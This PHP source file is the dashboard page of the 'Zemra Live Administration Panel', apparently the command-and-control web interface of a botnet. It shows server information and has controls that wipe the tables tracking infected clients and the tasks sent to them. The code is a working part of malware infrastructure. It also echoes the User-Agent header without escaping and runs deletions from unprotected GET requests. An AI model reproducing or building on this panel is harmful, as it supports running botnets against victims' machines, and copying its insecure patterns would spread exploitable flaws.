<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	class Template_Dashboard
	{
		private $Content = NULL;
		private $Title = 'Dashboard';
		
		public function __construct()
		{
			global $Base;
			global $DB;
			
			$this->Content .= ('Welcome to the Zemra Live Administration Panel !<br /><br />');
			
			if($_GET['a'] == "clear_statistic") 
			{
				$DB->Query("DELETE FROM clients;");
				$DB->Query("DELETE FROM tasks_done;");
				$this->Content .= ('<div class="notification success">Statistic successfully cleared!</div>');
			}
			elseif($_GET['a'] == "clear_tasks")
			{
				$DB->Query("DELETE FROM tasks;");
				$DB->Query("DELETE FROM tasks_done;");
				$DB->Query("UPDATE clients SET TID = '0';");
				$this->Content .= ('<div class="notification success">Tasks successfully deleted!</div>');
			}
			
			$OS = $Base->Truncate((php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('v') . ', ' . php_uname('m')), 100);
			$PHP = phpversion() . ', ' . php_sapi_name();
			$ZEND = zend_version();
			$MYSQL_SERVER = mysql_get_server_info();
			$MYSQL_CLIENT = mysql_get_client_info();
			$PATH = dirname($_SERVER['SCRIPT_FILENAME']);
			$DOMAIN = $_SERVER['HTTP_HOST'];
			$USER_AGENT = $_SERVER['HTTP_USER_AGENT'];
			$IP = $_SERVER['REMOTE_ADDR'];
			
			$this->Content .= ('<p><b>Global:</b></p>
				<table>
					<tr><td width="20%"><b>Operation System:</b></td><td>' . $OS . '</td></tr>
					<tr><td><b>Control Panel:</b></td><td>' . __VERSION__ . '</td></tr>
					<tr><td><b>PHP:</b></td><td>' . $PHP . '</td></tr>
					<tr><td><b>Zend Engine:</b></td><td>' . $ZEND . '</td></tr>
					<tr><td><b>MySQL Server:</b></td><td>' . $MYSQL_SERVER . '</td></tr>
					<tr><td><b>MySQL Client:</b></td><td>' . $MYSQL_CLIENT . '</td></tr>
					<tr><td><b>Local Path:</b></td><td>' . $PATH . '</td></tr>
					<tr><td><b>Server Domain:</b></td><td>' . $DOMAIN . '</td></tr>
				</table><br />');
					
			$this->Content .= ('<p><b>User:</b></p>
				<table>
					<tr><td width="20%"><b>User Agent:</b></td><td>' . $USER_AGENT . '</td></tr>
					<td><b>IP:</b></td><td>' . $IP . '</td></tr>
				</table><br />');
			
			$this->Content .= ('<p><b>Tools:</b></p>');
			$this->Content .= ('<table><tr><td>
									<a href="?q=dashboard&a=clear_statistic" onclick="return confirm(\'Do you really want to clear the statistic ?\')" class="button">Clear Statistic</a><a href="?q=dashboard&a=clear_tasks" onclick="return confirm(\'Do you really want to delete all tasks?\')" class="button">Delete Tasks</a>
								</td></tr></table>');
		}
		
		public function GetContent()
		{
			return $this->Content;
		}
		
		public function GetTitle()
		{
			return $this->Title;
		}
	}
?>